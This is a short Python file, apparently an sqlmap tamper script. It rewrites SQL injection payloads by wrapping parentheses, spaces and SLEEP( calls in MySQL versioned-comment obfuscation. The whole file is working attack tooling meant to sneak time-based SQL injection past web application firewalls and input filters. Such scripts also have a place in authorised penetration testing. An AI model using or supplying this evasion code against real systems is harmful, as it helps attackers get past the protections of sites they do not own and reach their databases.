#!/usr/bin/env python

import time
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOW
def tamper(payload, **kwargs):
    if payload:
        payload=payload.replace("()","(/*!/*~*/*/)")
        payload=payload.replace(" ", " /*!/*~*/*/ ")
        payload=payload.replace("SLEEP(", "/*!/*~*/SLEEP(*/")
    return payload
